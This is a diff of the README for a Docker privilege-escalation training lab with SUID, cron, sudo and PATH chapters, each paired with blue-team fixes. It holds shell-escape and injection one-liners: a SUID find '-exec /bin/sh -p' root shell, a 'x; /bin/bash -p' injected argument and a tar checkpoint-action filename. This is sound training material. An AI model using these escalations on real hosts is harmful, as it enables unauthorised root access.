@@ -2,7 +2,7 @@
 
 <p align="center">
   <strong>Hands-on Linux privilege-escalation labs in Docker — where you <em>actually</em> get root.</strong><br/>
-  <sub>4 chapters live · 15 earlier paths plus 3 new PATH labs · every exploit CI-verified end-to-end · every bug paired with the blue-team fix.</sub>
+  <sub>4 chapters live · 18 paths to root · every exploit CI-verified end-to-end · every bug paired with the blue-team fix.</sub>
 </p>
 
 <p align="center">
@@ -20,32 +20,6 @@
     <img src="https://img.shields.io/badge/📖_Full_Walkthroughs-Open_The_Wiki-2b7bd5?style=for-the-badge" alt="Open the Wiki">
   </a>
 </p>
-
----
-
-## 🎬 What capturing a flag looks like
-
-```bash
-# Phish got you an SSH account on the target. You land as labuser1.
-labuser1@hollow-fileproc-01:~$ find / -perm -4000 -type f 2>/dev/null
-/usr/bin/sudo
-/usr/bin/passwd
-/usr/local/bin/suid-find          # ← huh, that's not standard
-/usr/local/bin/suid-python        # ← neither is this
-/usr/local/bin/logstats
-/usr/local/bin/logreader
-/usr/local/bin/report
-...
-
-# GTFOBins says that's enough. Two lines to a root shell:
-labuser1@hollow-fileproc-01:~$ /usr/local/bin/suid-find . -maxdepth 0 -exec /bin/sh -p \;
-sh-5.2# id
-uid=1001(labuser1) gid=1001(labuser1) euid=0(root) groups=1001(labuser1)
-sh-5.2# cat /root/flag.txt
-R2R{su1d_b1ts_are_forever_check_your_perms}
-```
-
-That was Chapter 01, Station A. Four more paths on the same host, four more mistakes to learn. Then Chapter 02 — same shape, cron triggers instead. Then 03 — sudo rules. Then you read [the wiki](https://github.com/Adw0rm-sec/road-to-root/wiki) and see exactly how a defender would have caught every single one of them.
 
 ---
 
@@ -75,124 +49,38 @@ cat /etc/crontab /etc/cron.d/* 2>/dev/null         # Chapter 02 surface
 sudo -l                                            # Chapter 03 surface
 ```
 
-Stuck? The chapter READMEs have hints with increasing detail; the [wiki](https://github.com/Adw0rm-sec/road-to-root/wiki) has the full debrief per station. The six questions below are what those commands are asking, and which lab a hit opens.
-
----
-
-## 🎯 Why Road to Root
-
-- **Story-driven, not a checklist.** You're an operator for *BlackReef Security* hitting *Hollow Industries*. Each box has a reason to exist in the fiction — it reads like a job, not homework.
-- **Five paths per box.** Fail one — four others are waiting. You *compare* techniques instead of memorising the "right" answer.
-- **Teaches the fix, not just the break.** Every station ships with a blue-team `find`/`grep`/`auditd` one-liner that would have killed the bug, plus the exact perms change that prevents it. Red team *and* blue team both learn here.
-- **Fully CI-verified.** `tests/verify_<chapter>.sh` exploits every path on every push. If the lab breaks, CI goes red. **15/15 paths pass today — every push, on a clean GitHub Actions runner.**
-- **Free, local, fast.** Docker-only. No VPN. No cloud. No signup. Reset any target with one command.
-- **The wiki is the course.** 25+ mentor-style pages: mission brief → recon with exact output → exploit **flag-by-flag** → the kernel/sudo/cron mechanic → 3–6 real-reader pitfalls → blue-team detect + fix → transferable lessons. Written the way a senior operator would walk a junior through the box — not the way a docs portal would catalogue it.
+Stuck? The chapter READMEs have hints with increasing detail; the [wiki](https://github.com/Adw0rm-sec/road-to-root/wiki) has the full debrief per station.
 
 ---
 
 ## 🗺️ What you'll learn
 
-You SSH in as `labuser1` (uid 1001). You are not root. Ask these six questions in order. The first lead is a lab you exploit yourself. Red boxes on the map are those labs. Click one and the walkthrough opens.
+- **Enumerate a box in four commands.** `sudo -l`, `find / -perm -4000`, the crontab, and `echo "$PATH"` — and read each result to know which hit opens which lab.
+- **Four classes of privesc, 18 paths to root.** SUID bits, cron trust, sudo rules, and PATH hijacking — each chapter has several independent routes, so failing one never ends the box.
+- **The one question under all of them.** *What does root touch that I can write?* — a file it reads, a directory it writes into, a config it sources, a command it calls by bare name. Answer it fast on any Linux host.
+- **Fix every path, not just break it.** The blue-team `find`/`grep`/`auditd` one-liner and the exact permission change that kills each bug.
 
-**1. Will root run a program for me, with no password?** Run `sudo -l`. A hit looks like `(ALL) NOPASSWD:` and a path. That path is the lab: [find](https://github.com/Adw0rm-sec/road-to-root/wiki/C03-Station-A-GTFOBins-sudo-find), [a script you can edit](https://github.com/Adw0rm-sec/road-to-root/wiki/C03-Station-B-Writable-Sudo-Script), [LD_PRELOAD](https://github.com/Adw0rm-sec/road-to-root/wiki/C03-Station-C-LD_PRELOAD-env_keep) (write the `.c` file, then `gcc`, then sudo), [a `*` in the path](https://github.com/Adw0rm-sec/road-to-root/wiki/C03-Station-D-Sudo-Wildcard-Symlink), or [a script that evals your file](https://github.com/Adw0rm-sec/road-to-root/wiki/C03-Station-E-Eval-Injection). The `*` lab gives you a root file, not a shell.
+You land as `labuser1` (uid 1001) — not root. Four questions map the box, and each one points at a chapter:
 
-**2. Does a program become root just because I ran it?** Run `find / -perm -u=s -type f 2>/dev/null`. The `-perm -u=s` flag means the setuid bit is on: the file runs as its owner, and owner `root` means that program is root while it runs. `2>/dev/null` only hides "Permission denied". Skip the normal Ubuntu set (`sudo`, `su`, `passwd`, `mount`, and the rest). An `s` in `-rwsr-xr-x` on anything else is the lab: [find](https://github.com/Adw0rm-sec/road-to-root/wiki/C01-Station-A-GTFOBins-find), [python](https://github.com/Adw0rm-sec/road-to-root/wiki/C01-Station-B-GTFOBins-python), [it calls `du` with no folder](https://github.com/Adw0rm-sec/road-to-root/wiki/C01-Station-C-PATH-Hijack), [it pastes your argument into a shell](https://github.com/Adw0rm-sec/road-to-root/wiki/C01-Station-D-Command-Injection), or [it loads a library from a folder you can write](https://github.com/Adw0rm-sec/road-to-root/wiki/C01-Station-E-Shared-Object-Hijack).
+```text
+labuser1 — uid 1001, not root
+│
+├── sudo -l              →  a NOPASSWD rule          →  Chapter 03 · Sudo  (5 paths)
+├── find / -perm -4000   →  an odd SUID binary       →  Chapter 01 · SUID  (5 paths)
+├── crontab + timers     →  a timed root job         →  Chapter 02 · Cron  (5 paths)
+└── echo "$PATH"         →  a writable dir on PATH    →  Chapter 04 · PATH  (3 new)
 
-**3. Does root run a file on a clock?** Run `ls -la /etc/crontab /etc/cron.d /etc/cron.daily /etc/cron.hourly` and `systemctl list-timers --all`. Cron is root's clock. Open the file the job names: [a script you can edit](https://github.com/Adw0rm-sec/road-to-root/wiki/C02-Station-A-Writable-Cron-Script), [a config that script reads](https://github.com/Adw0rm-sec/road-to-root/wiki/C02-Station-B-Writable-Sourced-Config), [a folder root runs every file in](https://github.com/Adw0rm-sec/road-to-root/wiki/C02-Station-C-Writable-Drop-Dir), [a command with no folder, such as `df`](https://github.com/Adw0rm-sec/road-to-root/wiki/C02-Station-D-Cron-PATH-Hijack), or [`tar` with a `*`](https://github.com/Adw0rm-sec/road-to-root/wiki/C02-Station-E-Tar-Wildcard-Injection).
-
-**4. Can I change a file or folder root will trust?** Run `echo "$PATH"`. Folders are searched left to right. A folder you can write, listed before `/usr/bin`, is a PATH hijack: C01-C when a setuid program calls `du`, C02-D when cron calls `df`. Chapter 04 on `target-path` adds the other three triggers: a sudo script that sets its own `PATH`, a service unit whose `PATH` lists a writable directory, and a writable `/etc/environment`.
-
-**5. Who am I, and did someone leave a password or a key?** Run `id`, `cat ~/.bash_history`, `ls -la ~/.ssh`, and `env`. `uid=1001` is labuser1. A password in history is not root. `su` to that user, run `sudo -l` again, and you are back at question 1.
-
-**6. What kernel is this?** Run `uname -a`. Write the version down. These containers share the machine's kernel, so a kernel exploit is not a lab here.
-
-```mermaid
-flowchart LR
-    START["<b>You're in</b><br/>labuser1, uid 1001<br/>not root"]
-
-    subgraph gSudo["1. sudo -l"]
-        direction TB
-        SudoQ["<b>Will root run a program<br/>for me with no password?</b>"]
-        C03A["<b>C03-A · find</b><br/>The rule names find"]
-        C03B["<b>C03-B · script you can edit</b><br/>sudo runs that file as root"]
-        C03C["<b>C03-C · LD_PRELOAD</b><br/>Write the .c, then gcc"]
-        C03D["<b>C03-D · star in the path</b><br/>cat reads a root file"]
-        C03E["<b>C03-E · eval</b><br/>the script runs your file"]
-        SudoQ --> C03A
-        SudoQ --> C03B
-        SudoQ --> C03C
-        SudoQ --> C03D
-        SudoQ --> C03E
-    end
-
-    subgraph gSuid["2. setuid"]
-        direction TB
-        SuidQ["<b>Does this program become root<br/>just because I ran it?</b>"]
-        C01A["<b>C01-A · find</b>"]
-        C01B["<b>C01-B · python</b>"]
-        C01C["<b>C01-C · PATH</b><br/>It calls du. Your du runs"]
-        C01D["<b>C01-D · your argument</b><br/>pasted into a shell"]
-        C01E["<b>C01-E · library</b><br/>a .so you can replace"]
-        SuidQ --> C01A
-        SuidQ --> C01B
-        SuidQ --> C01C
-        SuidQ --> C01D
-        SuidQ --> C01E
-    end
-
-    subgraph gCron["3. cron and timers"]
-        direction TB
-        CronQ["<b>Does root run a file<br/>on a clock?</b>"]
-        C02A["<b>C02-A · script you can edit</b>"]
-        C02B["<b>C02-B · config it reads</b>"]
-        C02C["<b>C02-C · drop folder</b>"]
-        C02D["<b>C02-D · PATH</b><br/>The job calls df. Your df runs"]
-        C02E["<b>C02-E · tar star</b>"]
-        CronQ --> C02A
-        CronQ --> C02B
-        CronQ --> C02C
-        CronQ --> C02D
-        CronQ --> C02E
-    end
-
-    START --> SudoQ
-    START --> SuidQ
-    START --> CronQ
-
-    click C03A "https://github.com/Adw0rm-sec/road-to-root/wiki/C03-Station-A-GTFOBins-sudo-find" "Open C03-A" _blank
-    click C03B "https://github.com/Adw0rm-sec/road-to-root/wiki/C03-Station-B-Writable-Sudo-Script" "Open C03-B" _blank
-    click C03C "https://github.com/Adw0rm-sec/road-to-root/wiki/C03-Station-C-LD_PRELOAD-env_keep" "Open C03-C" _blank
-    click C03D "https://github.com/Adw0rm-sec/road-to-root/wiki/C03-Station-D-Sudo-Wildcard-Symlink" "Open C03-D" _blank
-    click C03E "https://github.com/Adw0rm-sec/road-to-root/wiki/C03-Station-E-Eval-Injection" "Open C03-E" _blank
-    click C01A "https://github.com/Adw0rm-sec/road-to-root/wiki/C01-Station-A-GTFOBins-find" "Open C01-A" _blank
-    click C01B "https://github.com/Adw0rm-sec/road-to-root/wiki/C01-Station-B-GTFOBins-python" "Open C01-B" _blank
-    click C01C "https://github.com/Adw0rm-sec/road-to-root/wiki/C01-Station-C-PATH-Hijack" "Open C01-C" _blank
-    click C01D "https://github.com/Adw0rm-sec/road-to-root/wiki/C01-Station-D-Command-Injection" "Open C01-D" _blank
-    click C01E "https://github.com/Adw0rm-sec/road-to-root/wiki/C01-Station-E-Shared-Object-Hijack" "Open C01-E" _blank
-    click C02A "https://github.com/Adw0rm-sec/road-to-root/wiki/C02-Station-A-Writable-Cron-Script" "Open C02-A" _blank
-    click C02B "https://github.com/Adw0rm-sec/road-to-root/wiki/C02-Station-B-Writable-Sourced-Config" "Open C02-B" _blank
-    click C02C "https://github.com/Adw0rm-sec/road-to-root/wiki/C02-Station-C-Writable-Drop-Dir" "Open C02-C" _blank
-    click C02D "https://github.com/Adw0rm-sec/road-to-root/wiki/C02-Station-D-Cron-PATH-Hijack" "Open C02-D" _blank
-    click C02E "https://github.com/Adw0rm-sec/road-to-root/wiki/C02-Station-E-Tar-Wildcard-Injection" "Open C02-E" _blank
-
-    classDef startNode fill:#2c3e50,stroke:#34495e,stroke-width:3px,color:#ffffff
-    classDef qNode fill:#2980b9,stroke:#3498db,stroke-width:3px,color:#ffffff
-    classDef labNode fill:#c0392b,stroke:#e74c3c,stroke-width:3px,color:#ffffff
-    class START startNode
-    class SudoQ,SuidQ,CronQ qNode
-    class C03A,C03B,C03C,C03D,C03E,C01A,C01B,C01C,C01D,C01E,C02A,C02B,C02C,C02D,C02E labNode
+        exploit any one path  →  cat /root/flag.txt  →  R2R{…}
 ```
 
-Every red box ends at `/root/flag.txt`. The station list under the roster is the same 15 paths, with the file each one trusts.
-
-### Campaign roster
+## 🗺️ Campaign roster
 
 | # | Chapter | Host (codename) | Root cause | Difficulty | Status |
 |---|---|---|---|:---:|:---:|
-| 01 | **SUID Bits** | `target-suid` (`hollow-fileproc-01`) | Misused SUID binaries | ★☆☆☆ → ★★★☆ | ✅ Ready |
-| 02 | **Cron Jobs** | `target-cron` (`hollow-backup-01`) | Root's timers trust the wrong things | ★☆☆☆ → ★★★☆ | ✅ Ready |
-| 03 | **Sudo Rules** | `target-sudo` (`hollow-dmz-01`) | Dangerous `sudoers` entries | ★☆☆☆ → ★★★☆ | ✅ Ready |
-| 04 | **PATH Hijacking** | `target-path` (`hollow-ops-01`) | Root calls a command by name, and a writable directory is searched first | ★★☆☆ | ✅ Ready |
+| 01 | **[SUID Bits](https://github.com/Adw0rm-sec/road-to-root/wiki/Chapter-01-Overview)** | `target-suid` (`hollow-fileproc-01`) | Misused SUID binaries | ★☆☆☆ → ★★★☆ | ✅ Ready |
+| 02 | **[Cron Jobs](https://github.com/Adw0rm-sec/road-to-root/wiki/Chapter-02-Overview)** | `target-cron` (`hollow-backup-01`) | Root's timers trust the wrong things | ★☆☆☆ → ★★★☆ | ✅ Ready |
+| 03 | **[Sudo Rules](https://github.com/Adw0rm-sec/road-to-root/wiki/Chapter-03-Overview)** | `target-sudo` (`hollow-dmz-01`) | Dangerous `sudoers` entries | ★☆☆☆ → ★★★☆ | ✅ Ready |
+| 04 | **[PATH Hijacking](https://github.com/Adw0rm-sec/road-to-root/wiki/Chapter-04-Overview)** | `target-path` (`hollow-ops-01`) | Root calls a command by name, and a writable directory is searched first | ★★☆☆ | ✅ Ready |
 | 05 | Capabilities | — | `cap_setuid` on a binary | ★★★☆ | ⏳ Planned |
 | 06 | Writable `/etc/passwd` | — | Weak file permissions | ★☆☆☆ | ⏳ Planned |
 | 07 | NFS `no_root_squash` | — | Exported share mounts as root | ★★★☆ | ⏳ Planned |
@@ -207,7 +95,7 @@ Every red box ends at `/root/flag.txt`. The station list under the roster is the
 - **B · GTFOBins interpreter** — SUID copy of `python3` → write your own Python; `os.setuid(0); os.system("/bin/bash")`
 - **C · PATH hijack** — custom SUID binary calls `du` by bare name; plant a fake `du` early on `$PATH`
 - **D · Command injection** — custom SUID binary pastes `argv[1]` into a shell; `"x; /bin/bash -p"`
-- **E · Shared-object hijack** — custom SUID binary loads `libgreet.so` from a 0777 RPATH dir; replace the `.so` with your own constructor
+- **E · Shared-object hijack** — custom SUID binary loads `libgreet.so` from a 0777 RUNPATH dir; replace the `.so` with your own constructor
 
 </details>
 
@@ -218,7 +106,7 @@ Every red box ends at `/root/flag.txt`. The station list under the roster is the
 - **B · Writable sourced config** — a locked root script `source`s `/etc/rtr/backup.conf` (mode `0666`); `source` executes the file
 - **C · Writable drop directory** — root runs every `*.sh` in `/opt/jobs/` (mode `0777`); drop a new script
 - **D · Cron PATH hijack** — `/etc/cron.d/rtr-health` sets `PATH=/opt/maint/bin:…` with a writable first entry; shim `df`
-- **E · Tar wildcard injection** — root's `tar czf … *` inside `/opt/data/` (mode `0777`); `touch -- '--checkpoint-action=exec=sh pwn.sh'`
+- **E · Tar wildcard injection** — root's `tar czf … *` inside `/opt/data/` (mode `0777`); `touch -- '--checkpoint-action=exec=sh runme.sh'`
 
 </details>
 
@@ -271,24 +159,22 @@ One **attacker** box plus one vulnerable **target** per chapter, all on a shared
 
 ## 📖 The wiki — the proper way to work this range
 
-Every station page follows the same 9-section shape, so you always know where to look:
+Every station page follows the same shape, so you always know where to look:
 
-1. **Mission brief** (in-world)
-2. **Recon** — the exact commands, with the exact expected output
-3. **The flaw** — one sentence
-4. **The exploit** — every flag of every command explained
-5. **Why it works** — the kernel/sudo/cron mechanic + a timeline table
-6. **Pitfalls** — 3–6 real-reader traps (sticky bit, `-p`, `LD_PRELOAD` recursion, etc.)
-7. **Blue-team: detect** — the audit `find`/`grep`/auditd one-liners
-8. **Blue-team: fix** — the exact `chown`/`chmod`/config change
-9. **What you learned** — 3–5 transferable bullets that port to every future box
+1. **Exploit — do this first** — the working command, the `id` proof, the flag, and a token table that explains every piece
+2. **How you find it** — the recon that surfaces the bug, with real output
+3. **Why it works** — the kernel / sudo / cron / PATH mechanic, stated once
+4. **Pitfalls** — the real traps (`-p`, the sticky bit, `LD_PRELOAD` recursion, …)
+5. **Detect & fix** — the blue-team check and the permission change (full recipes in the Playbook)
+6. **What you learned** — the transferable lesson that ports to every future box
 
 Plus cross-cutting reference pages:
 
-- [SUID Privesc Reference](https://github.com/Adw0rm-sec/road-to-root/wiki/SUID-Privesc-Reference) — `s`/`S`/`t` bit chart, GTFOBins primer, AT_SECURE, RPATH deep dive
+- [The Map](https://github.com/Adw0rm-sec/road-to-root/wiki/Methodology-Map) — the decision tree: match what enumeration shows you to the station that exploits it
+- [SUID Privesc Reference](https://github.com/Adw0rm-sec/road-to-root/wiki/SUID-Privesc-Reference) — `s`/`S`/`t` bit chart, GTFOBins primer, AT_SECURE, RUNPATH deep dive
 - [Cron Privesc Reference](https://github.com/Adw0rm-sec/road-to-root/wiki/Cron-Privesc-Reference) — every path cron hides on Linux + the 5+2 recon questions
-- [Blue-Team Playbook](https://github.com/Adw0rm-sec/road-to-root/wiki/Blue-Team-Playbook) — all audit one-liners in one place
-- [Glossary](https://github.com/Adw0rm-sec/road-to-root/wiki/Glossary) — SUID / SGID / sticky / RPATH / `euid` vs `uid` / FHS / drop dir
+- [Blue-Team Playbook](https://github.com/Adw0rm-sec/road-to-root/wiki/Blue-Team-Playbook) — all detect + fix recipes in one place, for every chapter
+- [Glossary](https://github.com/Adw0rm-sec/road-to-root/wiki/Glossary) — SUID / SGID / sticky / RUNPATH / `euid` vs `uid` / drop dir
 - [FAQ & Troubleshooting](https://github.com/Adw0rm-sec/road-to-root/wiki/FAQ-And-Troubleshooting) — the Docker, cron-timing, sticky-bit gotchas
 - [Contributing New Chapters](https://github.com/Adw0rm-sec/road-to-root/wiki/Contributing-New-Chapters) — the template every lab follows
 
